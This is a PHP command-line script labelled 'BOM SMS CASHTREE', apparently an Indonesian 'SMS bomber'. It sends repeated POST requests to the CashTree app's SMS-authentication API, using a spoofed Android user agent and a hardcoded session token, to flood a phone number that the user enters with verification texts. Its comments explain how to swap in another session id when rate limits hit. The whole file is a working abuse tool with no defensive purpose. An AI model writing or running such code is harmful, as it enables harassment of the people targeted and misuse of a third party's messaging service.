<?php
// @sandro.putraa \\
// SGB TEAM         \\
function cash($nohp, $jumlah, $wait){
    $x = 0; 
    while($x < $jumlah) {
        
		$body = 'phone='.$nohp.'&pn=com.vitiglobal.cashtree&code=['.$kata.'] www.cashtree.id&lc=en_GB&av=23050&ov=5.1&mmses=cTUvhAkyW+IYHjxM1C9dmdpBbxvKtiDgl0k+hUoGRulQeZJVCI3KSKErgTF2CNlOBU11VJKONcVfEB7eKWAycA==';
    // jika limit rubah sendiri dengan session id kalian :)
				
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://api.ctree.id/api2/other/sms/auth");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: api.ctree.id","Content-Type: application/x-www-form-urlencoded","Connection: Keep-Alive","Content-Type: application/json; charset=utf-8","User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1; 1201 Build/LMY47I)"));
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
print "BOM SMS CASHTREE\n\n";
echo ".::[ BY Sandro.Putraa ]::.\n\n";
echo "NO HP?\nInput : ";
$nohp = trim(fgets(STDIN));
echo "Pesan?\nInput : ";
$kata = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo"";
echo "===> Sudah Auto Input Jeda <=== \n";
$wait = "600";
echo"";
$execute = cash($nohp, $jumlah, $wait);
print $execute;
print "DONE ALL SEND | Code by sandro.putraa\n";
?>
